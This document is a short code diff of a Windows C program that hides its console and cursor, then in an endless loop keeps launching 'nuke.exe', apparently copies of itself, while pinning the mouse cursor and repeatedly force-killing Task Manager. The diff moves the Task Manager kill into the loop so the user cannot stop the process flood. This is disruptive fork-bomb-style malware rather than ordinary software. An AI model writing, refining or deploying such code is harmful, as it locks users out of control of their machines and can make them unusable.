@@ -14,8 +14,9 @@ int main()
 {
 	ShowWindow(GetConsoleWindow(), SW_HIDE);
 	ShowCursor(FALSE);
-	system("taskkill /f /im Taskmgr.exe");
-	SetCursorPos(200, 200);
-	for (;;)
-	system("start nuke.exe");
+	for (;;) {
+		system("start nuke.exe");
+		SetCursorPos(200, 200);
+		system("taskkill /f /im Taskmgr.exe");
+	}
 }
